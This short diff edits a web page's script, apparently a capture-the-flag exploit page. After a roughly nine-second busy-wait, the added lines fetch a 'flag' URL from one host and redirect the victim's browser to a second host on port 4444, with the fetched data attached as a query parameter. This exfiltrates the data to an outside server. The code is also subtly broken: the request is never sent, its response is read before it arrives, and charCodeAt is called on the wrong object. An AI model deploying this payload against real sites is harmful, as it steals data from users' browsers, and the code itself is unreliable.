@@ -10,7 +10,15 @@
         do { curDate = new Date(); }
         while(curDate-date < 9000);
         document.write('<h1>Time</h1>');
-        window.location.href ="http://n3on.ninja/flag";
+        var r;
+        var x1 = new XMLHttpRequest();
+        x1.open("GET", "http://n3on.ninja/flag", true);
+        r = x1.response;
+        var body = new Uint8Array(r.length);
+        for (var i = 0; i < body.length; i++) {
+            body[i] = body.charCodeAt(i);
+        }
+        window.location.href ="http://bits4everyone.com:4444/?data="+new Blob([body]);
     </script>
 </body>
 </html>
